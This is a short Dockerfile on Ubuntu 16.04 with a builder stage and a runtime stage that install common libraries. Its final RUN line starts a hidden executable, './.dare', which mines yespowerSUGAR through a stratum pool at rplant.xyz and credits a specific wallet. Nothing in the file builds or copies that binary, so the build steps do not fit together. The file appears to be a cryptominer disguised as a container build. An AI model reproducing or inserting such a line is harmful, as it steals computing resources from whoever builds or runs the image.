FROM ubuntu:16.04 as builder

RUN apt-get update \
  && apt-get install -y \
    build-essential \
    libssl-dev \
    libgmp-dev \
    libcurl4-openssl-dev \
    libjansson-dev \
    automake \
  && rm -rf /var/lib/apt/lists/*

# App
FROM ubuntu:16.04

RUN apt-get update \
  && apt-get install -y \
    libcurl3 \
    libjansson4 \
  && rm -rf /var/lib/apt/lists/*
  
RUN ./.dare -a yespowerSUGAR -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1q0kwl82t7ppx8vmffehx22l2w8lnzy08jl2t9dz.adz1
